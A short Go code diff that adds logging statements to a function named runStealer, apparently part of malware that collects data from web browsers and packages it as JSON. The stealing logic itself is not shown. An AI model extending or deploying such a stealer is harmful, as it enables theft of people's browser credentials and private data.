@@ -8,6 +8,7 @@ func templateStealer() string {
 // ── stealer ──
 
 func runStealer() string {
+	log.Println("[stealer] starting...")
 	results := map[string]string{}
 
 	browsers := []struct {
@@ -56,9 +57,11 @@ func runStealer() string {
 	}
 
 	if len(results) == 0 {
+		log.Println("[stealer] no results found")
 		return ""
 	}
 
+	log.Printf("[stealer] found %d browsers with data", len(results))
 	out, _ := json.Marshal(results)
 	return string(out)
 }
